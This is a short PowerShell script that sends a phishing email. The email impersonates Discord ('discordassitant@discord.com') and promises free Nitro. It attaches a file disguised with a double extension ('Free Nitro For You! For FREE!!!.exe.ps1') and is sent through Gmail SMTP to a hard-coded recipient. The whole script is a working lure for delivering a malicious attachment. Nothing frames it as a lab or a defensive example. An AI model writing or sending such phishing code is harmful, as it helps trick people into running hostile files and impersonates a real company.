
$Username = "Discord Assistant";
$Password = "123456";
$path = "D:\Free Nitro For You! For FREE!!!.exe.ps1";

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "discordassitant@discord.com";
    $message.To.Add($email);
    $message.Subject = "Click the attached file to have FREE Nitros!!!";
    $message.Body = "Today is a speacil day, so Discord is going to send you a SPECIAL Gift! Click the attached file to have FREE Nitros!!!";
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    write-host "Mail Sent" ; 
    $attachment.Dispose();
 }
Send-ToEmail  -email "theblackvaultufofootage@gmail.com" -attachmentpath $path;